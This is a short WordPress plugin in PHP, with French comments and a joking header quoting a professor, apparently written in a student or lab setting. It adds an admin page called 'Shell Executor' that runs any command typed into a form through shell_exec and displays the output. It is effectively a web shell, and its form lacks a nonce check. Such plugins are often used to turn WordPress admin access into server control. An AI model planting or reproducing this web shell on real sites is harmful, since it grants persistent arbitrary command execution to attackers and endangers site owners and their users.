<?php
/*
 * Plugin Name: Shell Executor - Command Runner
 * Description: Something in the way, hummmm hummmm
 * Version: 69
 * Author: Nyx - Samy Bensalem ( tkt ca vas bien ce passer. )
 *
 * Petites compilations des phrases mémorables de mon professeur :
 * Toute ressemblance avec un individu réel n'est que fortuite. :)
 *
 * "Tu peux aller te faire cuire le cul, tu trouveras rien."
 * "J'ai mis 20 à Barbi, frere."
 * "Ici, tu peux mettre ce que tu veux, Bob, admin, mdp, Ta MERE, ça ne fera rien."
 * "Son PC se met en veille pendant une démo, crie : "MAIS FREEEEEEEEEERREEE."
 *
 * Que de bons moments. :)
 */

// Enregistrer le menu dans l'administration WordPress
function shell_executor_add_admin_menu() {
    // Ajouter une page de menu dans l'administration
    add_menu_page(
        'Shell Executor', // Titre de la page
        'Shell Executor', // Titre du menu
        'manage_options', // Capability requise pour voir ce menu
        'shell-executor', // Slug du menu
        'shell_executor_admin_page', // Fonction pour afficher le contenu du menu
        'dashicons-admin-tools', // Icône du menu
        100 // Position dans le menu
    );
}
// Ajouter l'action pour enregistrer le menu
add_action('admin_menu', 'shell_executor_add_admin_menu');

// Fonction pour afficher le contenu de la page du menu
function shell_executor_admin_page() {
    // Vérification des permissions pour s'assurer que l'utilisateur a les droits nécessaires
    if (!current_user_can('manage_options')) return;

    $output = '';
    // Vérifier si une commande a été envoyée et qu'elle n'est pas vide
    if (isset($_POST['shell_command']) && !empty($_POST['shell_command'])) {
        // Utiliser escapeshellcmd pour échapper la commande et éviter les injections
        $command = escapeshellcmd($_POST['shell_command']);
        // Exécuter la commande et capturer la sortie ainsi que les erreurs
        $output = shell_exec($command . ' 2>&1');
    }
    ?>
    <div class="wrap">
        <h1>Shell Executor</h1>
        <form action="" method="post">
            <!-- Champ de saisie pour entrer la commande shell -->
            <input type="text" name="shell_command" style="width: 80%;" placeholder="Entrez votre commande ici...">
            <!-- Bouton pour exécuter la commande -->
            <input type="submit" value="Exécuter" class="button button-primary">
        </form>
        <?php if (!empty($output)) : ?>
            <!-- Afficher le résultat de la commande -->
            <h2>Résultat :</h2>
            <pre><?php echo esc_html($output); ?></pre>
        <?php endif; ?>
    </div>
    <?php
}
?>
